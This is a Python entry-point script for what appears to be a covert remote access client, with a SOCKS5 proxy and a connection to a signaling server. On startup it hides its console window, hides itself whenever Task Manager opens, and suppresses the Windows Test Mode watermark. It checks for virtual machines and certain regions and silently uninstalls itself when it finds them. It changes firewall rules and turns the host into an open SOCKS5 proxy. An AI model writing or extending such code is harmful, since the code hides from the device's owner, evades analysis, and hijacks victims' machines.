"""Entry point for the remote client."""
from __future__ import annotations

import argparse
import asyncio
import logging
import os
import platform
import tempfile

from remote_client.config import (
    load_antifraud_config,
    resolve_session_id,
    resolve_signaling_token,
    resolve_team_id,
)
from remote_client.runtime import build_client, load_or_create_device_token
from remote_client.security.anti_frod_reg import analyze_region
from remote_client.security.anti_frod_vm import analyze_device
from remote_client.security.firewall import ensure_firewall_rules
from remote_client.security.self_destruct import silent_uninstall_and_cleanup
from remote_client.security.process_monitor import (
    start_taskmanager_monitor,
    stop_taskmanager_monitor,
    hide_console_window,
)
from remote_client.proxy import ProxySettings, load_proxy_settings_from_env, set_proxy_settings
from remote_client.windows.dpi import ensure_dpi_awareness

# Test Mode watermark remover (Windows only)
_watermark_remover = None


def _anti_fraud_disabled() -> bool:
    value = os.getenv("RC_DISABLE_ANTI_FRAUD", "")
    return value.strip().lower() in {"1", "true", "yes", "on"}


def _taskmanager_monitor_enabled() -> bool:
    value = os.getenv("RC_TASKMANAGER_MONITOR", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _hide_console_on_start() -> bool:
    value = os.getenv("RC_HIDE_CONSOLE", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _hide_test_mode_watermark_enabled() -> bool:
    """Check if Test Mode watermark hiding is enabled."""
    value = os.getenv("RC_HIDE_WATERMARK", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _socks5_enabled() -> bool:
    value = os.getenv("RC_SOCKS5_DISABLE", "")
    return value.strip().lower() not in {"1", "true", "yes", "on"}


def _socks5_udp_enabled() -> bool:
    value = os.getenv("RC_SOCKS5_UDP", "1")
    return value.strip().lower() not in {"0", "false", "no", "off"}


def _read_int_env(name: str, default: int) -> int:
    raw = os.getenv(name)
    if raw is None:
        return default
    try:
        return int(raw)
    except (TypeError, ValueError):
        return default


def _start_watermark_remover() -> None:
    """Start the Test Mode watermark remover on Windows."""
    global _watermark_remover
    if platform.system() != "Windows":
        return
    if not _hide_test_mode_watermark_enabled():
        return
    try:
        from remote_client.windows.vdd_driver import remove_test_mode_watermark_persistent
        _watermark_remover = remove_test_mode_watermark_persistent()
    except Exception as e:
        logging.getLogger(__name__).debug("Watermark remover failed: %s", e)


def _configure_logging() -> None:
    level_name = os.getenv("RC_LOG_LEVEL", "INFO").strip().upper()
    level = getattr(logging, level_name, logging.INFO)
    log_path = os.getenv("RC_LOG_PATH", "").strip()
    if not log_path:
        log_path = os.path.join(tempfile.gettempdir(), "remdesk_client.log")
    handlers: list[logging.Handler] = [logging.StreamHandler()]
    try:
        handlers.append(logging.FileHandler(log_path, encoding="utf-8"))
    except OSError:
        pass
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        handlers=handlers,
    )


def main() -> None:
    _configure_logging()
    ensure_dpi_awareness()

    proxy_server = None

    # Hide console window on startup if enabled
    if _hide_console_on_start():
        hide_console_window()

    # Hide Test Mode watermark (Windows only)
    _start_watermark_remover()

    # Start task manager monitor to auto-hide when taskmgr is opened
    if _taskmanager_monitor_enabled():
        start_taskmanager_monitor(hide_only=False)

    base_dir = os.path.dirname(os.path.abspath(__file__))
    proxy_settings = load_proxy_settings_from_env()
    if proxy_settings:
        set_proxy_settings(proxy_settings)
    antifraud_config = load_antifraud_config()
    if _anti_fraud_disabled():
        print("Region anti-fraud disabled for local testing.")
    else:
        vm_result = None
        reg_result = None
        if antifraud_config.vm_enabled:
            vm_result = analyze_device()
        if antifraud_config.region_enabled:
            reg_result = analyze_region(antifraud_config.countries)
        if (vm_result and vm_result.is_suspicious) or (
            reg_result and reg_result.is_suspicious
        ):
            silent_uninstall_and_cleanup(base_dir)
            return

    ensure_firewall_rules()

    parser = argparse.ArgumentParser(description="Remote controller client")
    parser.add_argument(
        "--session-id",
        help="Session identifier used to register with the signaling server.",
    )
    parser.add_argument(
        "--team-id",
        help="Team identifier bound to this client (optional).",
    )
    args = parser.parse_args()
    session_id = resolve_session_id(args.session_id)
    team_id = resolve_team_id(args.team_id)
    print(f"Using session_id: {session_id}")

    signaling_token = resolve_signaling_token()
    device_token = load_or_create_device_token()
    client_config = {
        "antifraud": {
            "vm": antifraud_config.vm_enabled,
            "region": antifraud_config.region_enabled,
            "countries": list(antifraud_config.countries),
        }
    }
    if _socks5_enabled():
        try:
            from remote_client.proxy.socks5_server import Socks5ProxyServer

            proxy_host = os.getenv("RC_SOCKS5_HOST", "0.0.0.0").strip() or "0.0.0.0"
            proxy_port = _read_int_env("RC_SOCKS5_PORT", 1080)
            proxy_udp = _socks5_udp_enabled()
            proxy_server = Socks5ProxyServer(
                host=proxy_host,
                port=proxy_port,
                enable_udp=proxy_udp,
            )
            try:
                proxy_server.start()
            except OSError as exc:
                logging.getLogger(__name__).warning(
                    "SOCKS5 proxy port %s unavailable, selecting random port: %s",
                    proxy_port,
                    exc,
                )
                proxy_server = Socks5ProxyServer(
                    host=proxy_host,
                    port=0,
                    enable_udp=proxy_udp,
                )
                proxy_server.start()
            public_host = (
                os.getenv("RC_SOCKS5_PUBLIC_HOST", "").strip()
                or os.getenv("RC_PROXY_HOST", "").strip()
            )
            proxy_payload = {
                "enabled": True,
                "type": "socks5",
                "port": proxy_server.port,
                "udp": proxy_udp,
            }
            if public_host:
                proxy_payload["host"] = public_host
            client_config["proxy"] = proxy_payload
            export_host = public_host or proxy_host
            set_proxy_settings(
                ProxySettings(
                    host=export_host,
                    port=proxy_server.port,
                    proxy_type="socks5",
                )
            )
        except Exception as exc:
            logging.getLogger(__name__).warning("SOCKS5 proxy failed: %s", exc)
    client = build_client(
        session_id,
        signaling_token,
        device_token,
        team_id,
        client_config,
    )
    try:
        asyncio.run(client.run_forever())
    finally:
        stop_taskmanager_monitor()
        if proxy_server is not None:
            try:
                proxy_server.stop()
            except Exception:
                pass


if __name__ == "__main__":
    main()
